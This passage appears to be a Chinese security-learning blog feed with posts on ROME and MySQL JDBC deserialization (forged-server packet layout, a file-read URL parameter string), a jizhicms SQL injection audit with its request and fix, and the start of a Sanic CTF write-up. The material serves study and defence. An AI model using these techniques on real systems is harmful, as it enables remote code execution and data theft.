class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/12768">https://xz.aliyun.com/t/12768</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;什么是ROME&quot;&gt;&lt;a href=&quot;#什么是ROME&quot; class=&quot;headerlink&quot; title=&quot;什么是ROME&quot;&gt;&lt;/a&gt;什么是ROME&lt;/h2&gt;&lt;p&gt;简单来说, ROME工具库实现Java对象和XML数据之间的转换&lt;/p&gt;
&lt;h2 id=&quot;环境依赖&quot;</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="ROME反序列化" scheme="http://example.com/tags/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>JDBC反序列化</title>
    <link href="http://example.com/2024/08/19/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/08/19/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-08-19T12:19:10.000Z</published>
    <updated>2024-08-22T07:36:26.986Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JDBC基础"><a href="#JDBC基础" class="headerlink" title="JDBC基础"></a>JDBC基础</h2><p>参考</p><p><a href="https://liaoxuefeng.com/books/java/jdbc/basic/">https://liaoxuefeng.com/books/java/jdbc/basic/</a></p><p>浅尝一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>数据库版本为 8.0.12</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdbcDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/learnjdbc?useSSL=false&amp;characterEncoding=utf8&amp;serverTimezone=GMT&quot;</span>; <span class="comment">// 这里加上serverTimezone=GMT 不然会报错</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;learn&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;learnpassword&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password)) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;SELECT id, grade, name, gender FROM students WHERE gender=? AND grade=?&quot;</span>))&#123;</span><br><span class="line">                ps.setObject(<span class="number">1</span>, <span class="string">&quot;M&quot;</span>);</span><br><span class="line">                ps.setObject(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> ps.executeQuery())&#123;</span><br><span class="line">                    <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                        <span class="type">long</span> <span class="variable">id</span> <span class="operator">=</span> rs.getLong(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">                        <span class="type">long</span> <span class="variable">grade</span> <span class="operator">=</span> rs.getLong(<span class="string">&quot;grade&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;gender&quot;</span>);</span><br><span class="line">                        System.out.println(String.format(<span class="string">&quot;%d %d %s %s&quot;</span>, id, grade, name, gender));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JDBC反序列化"><a href="#JDBC反序列化" class="headerlink" title="JDBC反序列化"></a>JDBC反序列化</h2><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>首先看一下链子是怎么来的</p><p>原作者在<code>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</code>中发现了一个反序列化的入口</p><p>再找调用了<code>getObject</code>的地方</p><p>在 <code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rs = stmt.executeQuery(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>);            ResultSetUtil.resultSetToMap(toPopulate, rs);</span><br></pre></td></tr></table></figure><p>resultSetToMap中调用了readObject</p><p><code>ServerStatusDiffInterceptor</code>是一个拦截器，在JDBC URL中设定属性queryInterceptors为<code>ServerStatusDiffInterceptor</code>时，执行查询语句会调用拦截器的preProcess和postProcess方法, 而<code>preProcess</code>和<code>postProcess</code>又调用了<code>populateMapWithSessionStatusValues</code>, 进而最终触发readObject</p><p>有点乱, 上图:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820140216574.png" alt="image-20240820140216574"></p><p>问题就出在数据库查询<code>SHOW SESSION STATUS</code>返回的rs未经过验证进行反序列化, 造成了一个服务端打客户端的反序列化漏洞</p><p>因此, 下一步是伪造一个mysql数据库返回恶意数据</p><h3 id="伪造mysql服务器"><a href="#伪造mysql服务器" class="headerlink" title="伪造mysql服务器"></a>伪造mysql服务器</h3><p>wireshark抓本地回环的包, 过滤出mysql的数据包</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820140601889.png" alt="image-20240820140601889"></p><p>简单理解一下原理</p><p>以下内容来自 <a href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p><p>No.1699是一个问候报文, </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820142021243.png" alt="image-20240820142021243"></p><p>直接发送即可</p><p>之后客户端尝试连接数据库, 服务端返回Respone OK, 即 No.1716</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820142206566.png" alt="image-20240820142206566"></p><p>也是直接发送即可</p><p>之后是编写 <code>show session status</code>的响应包</p><blockquote><p><code>show session status</code>属于<strong>request Query</strong> 报文。对于查询数据包的响应包可以分为四种：错误包（ERR Packet）、正确包（OK Packet）、 Protocol::LOCAL_INFILE_Request、结果集（ProtocolText::Resultset）。我们上面看到的<strong>Response OK</strong>数据包就是<strong>OK packet</strong>。</p></blockquote><p>一个结果集响应包的结构。</p><ul><li>数据段1：说明下面的结果集有多少列</li><li>数据段2：列的定义</li><li>数据段3： EOF 包</li><li>数据段4：行数据。</li></ul><h4 id="数据段1"><a href="#数据段1" class="headerlink" title="数据段1"></a>数据段1</h4><p><code>01 00 00 01 02</code> 前三字节表示数据长度为1，sequence id为1，最后一字节02表示有两列</p><h4 id="数据段2"><a href="#数据段2" class="headerlink" title="数据段2"></a>数据段2</h4><p><code>1a000002036465660001630163016301630c3f00ffff0000fcffff000000</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1a 00 00  //3字节表示长度（这个长度说的是协议的内容长度，不包括序号那一字节）</span><br><span class="line">02      //序号 因为是第二个数据字段</span><br><span class="line">03646566  // 这个就是def的意思。</span><br><span class="line">00   //schema 协议因为不使用就用00</span><br><span class="line">01 63  //table 因为我们使用列数据，就不需要名字了，下面几个都是任意字符。字符串第一字节是用来说明长度的。</span><br><span class="line">01 63  //org_table  01表示1字节，63是数据</span><br><span class="line">0163    //name  </span><br><span class="line">0163   //org_name</span><br><span class="line">0c      filler  // length of the following fields 总是0x0c</span><br><span class="line">3f00   //characterset  字符编码 003f是binary </span><br><span class="line">ffff0000  column_length //允许数据最大长度，就是我们行数据的最大长度。ffff</span><br><span class="line">fc    //column_type 这一列数据类型  fc表示blob  </span><br><span class="line">9000    //flags  9000用的官方的 poc可以运行。  看fnmsd的要大于128好像。</span><br><span class="line">00          //decimals</span><br><span class="line">0000        //filler_2</span><br></pre></td></tr></table></figure><h4 id="数据段3"><a href="#数据段3" class="headerlink" title="数据段3"></a>数据段3</h4><p>EOF包</p><h4 id="数据段4"><a href="#数据段4" class="headerlink" title="数据段4"></a>数据段4</h4><p>数据字段4就是POC了。POC其实和上面一样的。计算出长度（3字节）序号（1字节）行数据（行数据第一个字节是数据的长度）</p><p>最终poc直接拿大佬的来用了</p><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>改一下配置文件直接使用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820150150852.png" alt="image-20240820150150852"></p><p>值得注意的是这里居然还有任意文件读取,</p><p>加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&amp;maxAllowedPacket=655360</span><br></pre></td></tr></table></figure><p>即可</p><p>这部分内容直接参考</p><p><a href="https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/">https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/</a></p><p><a href="https://xz.aliyun.com/t/12011">https://xz.aliyun.com/t/12011</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p><p><a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p><p><a href="https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/">https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/</a></p><p><a href="https://xz.aliyun.com/t/12011">https://xz.aliyun.com/t/12011</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JDBC基础&quot;&gt;&lt;a href=&quot;#JDBC基础&quot; class=&quot;headerlink&quot; title=&quot;JDBC基础&quot;&gt;&lt;/a&gt;JDBC基础&lt;/h2&gt;&lt;p&gt;参考&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://liaoxuefeng.com/books/java/</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="JDBC反序列化" scheme="http://example.com/tags/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计之CMS漏洞初探</title>
    <link href="http://example.com/2024/08/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BCMS%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/"/>
    <id>http://example.com/2024/08/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BCMS%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/</id>
    <published>2024-08-01T15:32:50.000Z</published>
    <updated>2024-08-20T07:29:37.827Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP代码审计之CMS漏洞初探"><a href="#PHP代码审计之CMS漏洞初探" class="headerlink" title="PHP代码审计之CMS漏洞初探"></a>PHP代码审计之CMS漏洞初探</h1><p>Java代码实在难懂, 索性先暂时放一放, 最近心血来潮想提升一下php代码审计的能力, (真的很想体验一下真实的挖漏洞)</p><p>话不多说我们随便找几个cms已经公布的漏洞来练练手</p><h2 id="jizhicms-v2-3-3-sql注入"><a href="#jizhicms-v2-3-3-sql注入" class="headerlink" title="jizhicms v2.3.3 sql注入"></a>jizhicms v2.3.3 sql注入</h2><p>这个2.3.3版本下载不到但是能下到2.3.2</p><p><a href="https://gitee.com/Cherry_toto/jizhicms/repository/archive/2.3.2">https://gitee.com/Cherry_toto/jizhicms/repository/archive/2.3.2</a></p><p>搭建好环境开干</p><p>我测试了一下也是存在这个漏洞的</p><p>首先漏洞的点在这个位置</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php/admins/Member/memberedit.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>jizhicms</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>234</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://jizhicms</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://jizhicms/index.php/admins/Member/memberedit/id/2.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=apkas20el5jn5o9070b1gj3176</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">go</span>=<span class="number">1</span>&amp;id=<span class="number">1</span>&amp;username=aaa&amp;openid=rtr&amp;sex=<span class="number">0</span>&amp;gid=<span class="number">0</span>&amp;litpic=&amp;file=&amp;tel=&amp;jifen=<span class="number">0</span>.<span class="number">00</span>&amp;money=<span class="number">0</span>.<span class="number">00</span>&amp;email=&amp;province=&amp;city=&amp;address=&amp;regtime=<span class="number">2024</span>-<span class="number">08</span>-<span class="number">01</span>+<span class="number">22</span>%<span class="number">3</span>A33%<span class="number">3</span>A07&amp;logintime=<span class="number">2024</span>-<span class="number">08</span>-<span class="number">01</span>+<span class="number">22</span>%<span class="number">3</span>A33%<span class="number">3</span>A07&amp;signature=&amp;birthday=&amp;pid=<span class="number">0</span>&amp;isshow=<span class="number">1</span>&amp;pass=&amp;repass=</span></span><br></pre></td></tr></table></figure><p>id参数存在注入</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240801234103555.png" alt="image-20240801234103555"></p><p>那么就去代码中看看</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802003811944.png" alt="image-20240802003811944"></p><p>不难定位到这个逻辑实现的位置</p><p>从源码来看这个cms是一个MVC架构,</p><p>我们主要去看update方法</p><p>调试一下很容易就能定位到</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802004056234.png" alt="image-20240802004056234"></p><p>这段代码是没有过滤的, 有可能存在过滤的位置也就是<code>__prepera_format</code>和<code>runSql</code>这两个方法</p><p>我们先去调试<code>__prepera_format</code>这个方法</p><p>不难看出这里是有问题的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802122153511.png" alt="image-20240802122153511"></p><p>这里的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;int&#x27;</span>)!==<span class="literal">false</span> || <span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;decimal&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="variable">$rows</span>[<span class="variable">$field</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本意应该是通过<code>jz_member</code>的结构来格式化我们查询的内容, 而在<code>jz_member</code>表中<code>id</code>字段应该是<code>int(11)</code>这里虽然正确判断出了id字段为int型, 但是在处理数据时并没有把我们传入的id强转为数字型而是直接进行了赋值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802122628190.png" alt="image-20240802122628190"></p><p>可以看见id字段仍然是字符串</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802123335763.png" alt="image-20240802123335763"></p><p>同样的问题, <code>$condition</code>也就是传入的id字段的内容,直接被拼接到了where语句后</p><p>我们去跟进<code>runSql</code>也是看不见任何的过滤</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802123538306.png" alt="image-20240802123538306"></p><p>由此造成了sql注入</p><p>那么我们简单修复一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__prepera_format</span>(<span class="params"><span class="variable">$rows</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$table</span> = <span class="built_in">self</span>::<span class="variable">$table</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">getTable</span>(<span class="variable">$table</span>);  </span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();  </span><br><span class="line"><span class="variable">$columns</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_CLASS</span>);</span><br><span class="line"><span class="variable">$newcol</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$columns</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$field</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$value</span>-&gt;Field);</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;int&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;decimal&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span>)&#123;</span><br><span class="line">                        <span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="title function_ invoke__">floatval</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="number">0.0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span> )&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="variable">$rows</span>[<span class="variable">$field</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$newcol</span>;</span><br><span class="line"><span class="comment">//return array_intersect_key($rows,$newcol);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802125221708.png" alt="image-20240802125221708"></p><p>可以看见此时sqlmap已经跑不出来了</p><p>实际上在2.3.2版本是有全局字符串过滤的, 但是并没有包含对id的过滤</p><p>官方的修复手法简单粗暴, 在<code>get_fields_data</code>函数中加上了:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">format_param</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>这里的format_param函数将id强转为int</p><p><a href="https://www.yijinglab.com/specialized/20230308140107">https://www.yijinglab.com/specialized/20230308140107</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP代码审计之CMS漏洞初探&quot;&gt;&lt;a href=&quot;#PHP代码审计之CMS漏洞初探&quot; class=&quot;headerlink&quot; title=&quot;PHP代码审计之CMS漏洞初探&quot;&gt;&lt;/a&gt;PHP代码审计之CMS漏洞初探&lt;/h1&gt;&lt;p&gt;Java代码实在难懂, 索性先暂时放</summary>
      
    
    
    
    
    <category term="PHP代码设计" scheme="http://example.com/tags/PHP%E4%BB%A3%E7%A0%81%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>从Sanic到Sanic&#39;s revenge</title>
    <link href="http://example.com/2024/07/27/%E4%BB%8ESanic%E5%88%B0Sanic-s-revenge/"/>
    <id>http://example.com/2024/07/27/%E4%BB%8ESanic%E5%88%B0Sanic-s-revenge/</id>
    <published>2024-07-27T09:35:21.000Z</published>
    <updated>2024-07-29T16:23:38.650Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从Sanic到Sanic’s-revenge"><a href="#从Sanic到Sanic’s-revenge" class="headerlink" title="从Sanic到Sanic’s revenge"></a>从Sanic到Sanic’s revenge</h1><h2 id="Sanic"><a href="#Sanic" class="headerlink" title="Sanic"></a>Sanic</h2><p>首先是国赛中的一道名为Sanic的题目</p><p>参考gxn师傅的题解</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p><p>首先访问&#x2F;src拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 